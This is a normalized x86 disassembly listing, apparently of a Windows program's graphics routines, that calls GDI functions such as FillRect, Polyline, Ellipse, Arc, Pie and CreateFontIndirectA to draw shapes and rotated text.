mov esi ebx
lea edi [ ebp - 0x38 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x30 ]
cmp eax [ ebp - 0x38 ]
jge r-xdata
cmp [ ebp + 0x8 ] 0x2
je r-xdata
mov eax [ ebp - 0x2c ]
cmp eax [ ebp - 0x34 ]
jge r-xdata
lea edx [ ebp - 0x30 ]
lea eax [ ebp - 0x38 ]
call sub_4603bc
lea edx [ ebp + 0xc ]
lea eax [ ebp - 0x3c ]
call sub_4603bc
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xffffffff
mov al [ ebp + 0x8 ]
sub al 0x2
jb r-xdata
lea edx [ ebp - 0x2c ]
lea eax [ ebp - 0x34 ]
call sub_4603bc
push ebp
xor eax eax
call sub_45daf4
pop ecx
jmp r-xdata
sub al 0x2
jb r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_45daf4
pop ecx
jmp r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
call SelectObject
push eax
call DeleteObject
push ebp
call sub_45dd38
pop ecx
dec eax
sub al 0x2
jb r-xdata
push ebp
call sub_45dc20
pop ecx
jmp r-xdata
jmp r-xdata
sub_45dfd8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41d64c
push eax
push esi
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call FillRect
pop esi
pop ebx
retn
sub_45dffc
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x3c ]
mov edx 0x1
mov eax [ ebx + 0xc ]
call sub_41d43c
dec [ ebp - 0x18 ]
dec [ ebp - 0x1c ]
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec esi
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xc ]
call sub_41d310
mov eax [ ebp - 0x14 ]
mov [ edi ] eax
mov eax [ ebp - 0x10 ]
mov [ edi + 0x4 ] eax
mov eax [ ebp - 0x24 ]
mov [ edi + 0x8 ] eax
mov eax [ ebp - 0x20 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ edi + 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov [ edi + 0x14 ] eax
push 0x3
push edi
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call Polyline
mov edx [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_41d310
dec [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov [ edi ] eax
mov eax [ ebp - 0x8 ]
mov [ edi + 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ edi + 0x8 ] eax
mov eax [ ebp - 0x18 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x14 ]
mov [ edi + 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov [ edi + 0x14 ] eax
push 0x3
push edi
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call Polyline
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x24 ]
push eax
call InflateRect
test esi esi
jg r-xdata
sub_45e0ec
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_41c964
mov esi eax
mov edx esi
and dl 0xff
mov eax esi
shr ax 0x8
mov ecx esi
shr ecx 0x10
and cl 0xff
mov [ esp ] cl
cmp bl dl
jae r-xdata
xor edx edx
sub dl bl
jmp r-xdata
xor eax eax
sub al bl
jmp r-xdata
cmp bl al
jae r-xdata
mov [ esp ] 0x0
sub [ esp ] bl
jmp r-xdata
cmp bl [ esp ]
jae r-xdata
mov cl [ esp ]
xchg edx eax
call sub_4069c4
pop edx
pop esi
pop ebx
retn
sub_45e144
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx ebx
call sub_45e0ec
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx ebx
call sub_45e0ec
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41d618
pop ebx
pop ebp
retn
sub_45e190
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0x18 ]
push esi
push edi
lea edx [ ebp - 0x18 ]
mov ecx ebx
mov eax [ ebp - 0x8 ]
call sub_45cd60
push esi
push edi
lea edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_45cd60
mov eax [ ebp + 0x14 ]
push eax
push edi
lea edx [ ebp - 0x28 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_45cd60
push esi
mov eax [ ebp + 0xc ]
push eax
lea edx [ ebp - 0x30 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_45cd60
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41d72c
test al al
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41d610
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0xc0 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0xc4 ] edx
push esi
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0xc8 ]
mov ecx ebx
mov eax [ ebp - 0x8 ]
call sub_45cd60
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0xd0 ]
mov ecx ebx
mov eax [ ebp - 0x8 ]
call sub_45cd60
mov eax [ ebp + 0x14 ]
push eax
push edi
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0xd8 ]
mov ecx ebx
mov eax [ ebp - 0x8 ]
call sub_45cd60
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xd0 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx + 0xd8 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0xc0 ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0xc4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x30 ]
mov [ eax + 0xc8 ] edx
mov edx [ ebp - 0x2c ]
mov [ eax + 0xcc ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0xd8 ] edx
mov edx [ ebp - 0x24 ]
mov [ eax + 0xdc ] edx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0xc0 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0xc4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0xc8 ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0xcc ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0xd0 ] edx
mov edx [ ebp - 0x24 ]
mov [ eax + 0xd4 ] edx
mov eax [ ebp + 0x14 ]
push eax
push edi
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0xd8 ]
mov ecx ebx
mov eax [ ebp - 0x8 ]
call sub_45cd60
mov eax [ ebp - 0x8 ]
call sub_45cc3c
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0xd0 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_45cd60
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xd0 ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
push esi
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0xd8 ]
mov ecx ebx
mov eax [ ebp - 0x8 ]
call sub_45cd60
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xdc ]
cmp eax [ ebp - 0x1c ]
jge r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_45cc3c
jmp r-xdata
push ebp
mov al [ rw-data ]
call sub_45e144
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0xc0 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0xc4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0xc8 ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0xcc ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x30 ]
mov [ eax + 0xd0 ] edx
mov edx [ ebp - 0x2c ]
mov [ eax + 0xd4 ] edx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_45cc3c
push ebp
mov al [ rw-data ]
call sub_45e144
pop ecx
mov eax [ ebp - 0x8 ]
call sub_45cc3c
push ebp
mov al [ rw-data ]
call sub_45e144
pop ecx
sub_45e41c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
mov eax [ ebp + 0xc ]
push eax
lea edx [ ebx + 0xc0 ]
mov ecx esi
mov eax ebx
call sub_45cd60
push edi
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebx + 0xc8 ]
mov ecx esi
mov eax ebx
call sub_45cd60
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebx + 0xd0 ]
mov ecx esi
mov eax ebx
call sub_45cd60
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
lea edx [ ebx + 0xd8 ]
mov ecx esi
mov eax ebx
call sub_45cd60
mov eax ebx
call sub_45cc3c
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_45e48c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax [ ebp + 0xc ]
push eax
lea edx [ ebx + 0xc0 ]
mov ecx edi
mov eax ebx
call sub_45cd60
push esi
mov eax [ ebp + 0xc ]
push eax
lea edx [ ebx + 0xc8 ]
mov ecx [ ebp + 0x10 ]
mov eax ebx
call sub_45cd60
push esi
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebx + 0xd0 ]
mov ecx [ ebp + 0x10 ]
mov eax ebx
call sub_45cd60
push esi
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebx + 0xd8 ]
mov ecx edi
mov eax ebx
call sub_45cd60
mov eax ebx
call sub_45cc3c
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_45e524
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_45ceb8
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_45e564
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
cmp esi 0x168
jle r-xdata
mov dl 0x1
mov eax [ ebx + 0x10 ]
call sub_41d734
mov eax [ ebx + 0x4 ]
call sub_41dd60
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x44 ]
push eax
push 0x3c
mov eax [ ebx + 0x8 ]
call sub_41ce38
push eax
call GetObjectA
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x2c ] 0x7
cmp [ ebx + 0xab ] 0x0
je r-xdata
sub esi 0x168
lea eax [ ebp - 0x44 ]
push eax
call CreateFontIndirectA
push eax
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x5c ]
push esi
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
push eax
call DeleteObject
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
fld [ ebx + 0xb0 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
push 0x48
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x1c ]
push eax
mov eax [ ebx + 0x8 ]
call sub_41d0a8
mov [ ebp - 0x48 ] eax
fild [ ebp - 0x48 ]
fmul [ ebx + 0xb0 ]
call sub_402990
mov edx eax
mov eax 0x1
call sub_460384
push eax
call MulDiv
neg eax
mov [ ebp - 0x44 ] eax
sub_45e654
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov eax [ eax + 0x4 ]
call sub_41dd60
mov ebx eax
push 0x0
push edi
push esi
push ebx
call MoveToEx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ebx
call LineTo
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_45e688
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_45ceb8
push esi
lea ecx [ ebp + 0xc ]
lea edx [ ebp + 0x10 ]
mov eax ebx
call sub_45ceb8
mov eax [ ebx + 0x4 ]
call sub_41dd60
mov ebx eax
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push ebx
call MoveToEx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ebx
call LineTo
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_45e6e8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call Polygon
pop edi
pop esi
pop ebx
retn
sub_45e720
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call Ellipse
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_45e74c
push ebp
mov ebp esp
add esp 0xfffffea4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41dd60
mov [ ebp - 0x40 ] eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ ebx + 0x91 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_45ceb8
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp + 0xc ]
lea edx [ ebp + 0x10 ]
mov eax ebx
call sub_45ceb8
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x40 ]
push eax
call Ellipse
jmp r-xdata
mov eax [ ebp + 0xc ]
inc eax
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call Ellipse
mov eax [ ebp + 0x10 ]
add eax [ ebp - 0x4 ]
sar eax 0x1
jns r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
add eax [ ebp - 0x8 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x4 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
sub eax [ ebp - 0x8 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x140 ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
call sub_45cd60
mov esi 0x1
lea edi [ ebp - 0x138 ]
adc eax 0x0
mov [ ebp - 0x15c ] esi
fild [ ebp - 0x15c ]
fld [ r-xdata ]
fmulp st1
add esp 0xfffffff4
fstp [ esp ]
fwait
lea edx [ ebp - 0x38 ]
lea eax [ ebp - 0x28 ]
call sub_45c414
fild [ ebp - 0x18 ]
fld [ ebp - 0x38 ]
fmulp st1
call sub_40299c
add eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
fild [ ebp - 0x14 ]
fld [ ebp - 0x28 ]
fmulp st1
call sub_40299c
mov ecx eax
add ecx [ ebp - 0x10 ]
mov edx edi
mov eax ebx
call sub_45cd60
inc esi
add edi 0x8
cmp esi 0x20
jne r-xdata
mov eax [ ebx + 0x10 ]
call sub_41d72c
cmp al 0x1
je r-xdata
mov eax [ ebx + 0xc ]
call sub_41d404
cmp al 0x5
je r-xdata
mov eax [ ebx + 0xc ]
call sub_41d404
mov [ ebp - 0x39 ] al
mov dl 0x5
mov eax [ ebx + 0xc ]
call sub_41d40c
mov eax [ ebx + 0x4 ]
call sub_41dd60
mov [ ebp - 0x40 ] eax
lea edx [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov eax ebx
call sub_45cd0c
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x158 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x154 ] eax
mov eax [ ebp - 0x140 ]
mov [ ebp - 0x150 ] eax
mov eax [ ebp - 0x13c ]
mov [ ebp - 0x14c ] eax
mov eax [ ebp - 0x138 ]
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x134 ]
mov [ ebp - 0x144 ] eax
push 0x3
lea eax [ ebp - 0x158 ]
push eax
mov eax [ ebp - 0x40 ]
push eax
call Polygon
mov eax [ ebp - 0x138 ]
mov [ ebp - 0x150 ] eax
mov eax [ ebp - 0x134 ]
mov [ ebp - 0x14c ] eax
mov esi 0x1e
lea edi [ ebp - 0x130 ]
push 0x20
lea eax [ ebp - 0x140 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call Polyline
jmp r-xdata
mov eax [ edi ]
mov [ ebp - 0x148 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0x144 ] eax
push 0x3
lea eax [ ebp - 0x158 ]
push eax
mov eax [ ebp - 0x40 ]
push eax
call Polygon
mov eax [ edi ]
mov [ ebp - 0x150 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0x14c ] eax
add edi 0x8
dec esi
jne r-xdata
mov dl [ ebp - 0x39 ]
mov eax [ ebx + 0xc ]
call sub_41d40c
sub_45e9d2
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_41c964
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call SetPixel
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_45ea00
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call Arc
pop edi
pop esi
pop ebx
pop ebp
retn 0x18
sub_45ea3c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call Pie
pop edi
pop esi
pop ebx
pop ebp
retn 0x18
sub_45ea78
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41d72c
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_45e0ec
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_45e0ec
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41d618
pop ebx
pop ebp
retn
sub_45ead0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x20c ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov al 0x20
call sub_45ea78
pop ecx
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x20c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x210 ]
sub eax edx
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x210 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x214 ]
jne r-xdata
mov eax ebx
add eax eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffdf8
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41dd60
push eax
call Polygon
pop edi
pop esi
pop ebx
pop ebp
retn
inc eax
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx * 8 - 0x31c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x214 ]
test eax eax
jle r-xdata
inc ebx
mov ecx [ ebp + 0x8 ]
mov esi [ edx ]
mov [ ecx + ebx * 8 - 0x210 ] esi
mov esi [ edx + 0x4 ]
mov [ ecx + ebx * 8 - 0x20c ] esi
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x210 ]
mov esi [ ebp + 0x8 ]
sub ecx [ esi - 0x20c ]
inc ecx
add ecx ebx
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx * 8 - 0x210 ]
mov esi [ ebp + 0x8 ]
mov esi [ esi - 0x214 ]
add esi esi
mov edi [ ebp + 0x8 ]
sub esi [ edi - 0x210 ]
add esi ebx
mov edi [ ebp + 0x8 ]
lea edi [ edi + esi * 8 - 0x210 ]
mov esi [ edi ]
mov [ ecx ] esi
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
add edx 0x8
dec eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x214 ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
add edx 0xfffffcec
mov ecx [ ebp + 0x8 ]
lea ebx [ ecx - 0x208 ]
mov ecx [ edx ]
mov [ ebx ] ecx
mov ecx [ edx + 0x4 ]
mov [ ebx + 0x4 ] ecx
add ebx 0x8
add edx 0x8
dec eax
jne r-xdata
sub_45ebfc
push ebp
mov ebp esp
add esp 0xfffffc9c
push ebx
push esi
push edi
mov [ ebp - 0x324 ] ecx
mov [ ebp - 0x320 ] edx
mov [ ebp - 0x4 ] eax
fld [ ebp + 0x10 ]
fsub [ ebp + 0x18 ]
fabs
fmul [ r-xdata ]
fld [ r-xdata ]
fdivp st1
fdiv [ r-xdata ]
call sub_402990
mov edx eax
mov eax 0x1e
call sub_46038c
add eax 0x2
mov [ ebp - 0x214 ] eax
mov eax [ ebp - 0x324 ]
push eax
mov eax [ ebp + 0x20 ]
push eax
lea edx [ ebp - 0x31c ]
mov ecx [ ebp - 0x320 ]
mov eax [ ebp - 0x4 ]
call sub_45cd60
fld [ ebp + 0x10 ]
fsub [ ebp + 0x18 ]
mov eax [ ebp - 0x214 ]
dec eax
mov [ ebp - 0x364 ] eax
fild [ ebp - 0x364 ]
fdivp st1
fstp [ ebp - 0x358 ]
fwait
fld [ ebp + 0x18 ]
fstp [ ebp - 0x330 ]
fwait
mov ebx [ ebp - 0x214 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41d72c
test al al
jne r-xdata
mov [ ebp - 0x35c ] 0x1
lea esi [ ebp - 0x314 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41d610
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ax [ ebp - 0x328 ]
push eax
push [ ebp - 0x32c ]
push [ ebp - 0x330 ]
lea edx [ ebp - 0x350 ]
lea eax [ ebp - 0x340 ]
call sub_45c414
fild [ ebp + 0x2c ]
fld [ ebp - 0x350 ]
fmulp st1
call sub_402990
mov edi eax
add edi [ ebp - 0x320 ]
fild [ ebp + 0x28 ]
fld [ ebp - 0x340 ]
fmulp st1
call sub_402990
mov edx [ ebp - 0x324 ]
sub edx eax
mov [ ebp - 0x360 ] edx
mov eax [ ebp - 0x360 ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov edx esi
mov ecx edi
mov eax [ ebp - 0x4 ]
call sub_45cd60
mov eax [ ebp - 0x360 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x214 ]
add eax eax
inc eax
sub eax [ ebp - 0x35c ]
lea edx [ ebp + eax * 8 - 0x210 ]
mov ecx edi
mov eax [ ebp - 0x4 ]
call sub_45cd60
fld [ ebp - 0x330 ]
fadd [ ebp - 0x358 ]
fstp [ ebp - 0x330 ]
fwait
inc [ ebp - 0x35c ]
add esi 0x8
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41d72c
test al al
jne r-xdata
mov eax [ ebp - 0x214 ]
mov eax [ ebp + eax * 8 - 0x31c ]
cmp eax [ ebp - 0x320 ]
jge r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_41d618
jmp r-xdata
mov eax [ ebp - 0x314 ]
cmp eax [ ebp - 0x320 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x31c ]
mov [ eax + 0xc0 ] edx
mov edx [ ebp - 0x318 ]
mov [ eax + 0xc4 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x214 ]
mov ecx [ ebp + edx * 8 - 0x31c ]
mov [ eax + 0xc8 ] ecx
mov ecx [ ebp + edx * 8 - 0x318 ]
mov [ eax + 0xcc ] ecx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x214 ]
mov ecx [ ebp + edx * 8 - 0x208 ]
mov [ eax + 0xd0 ] ecx
mov ecx [ ebp + edx * 8 - 0x204 ]
mov [ eax + 0xd4 ] ecx
mov eax [ ebp - 0x324 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
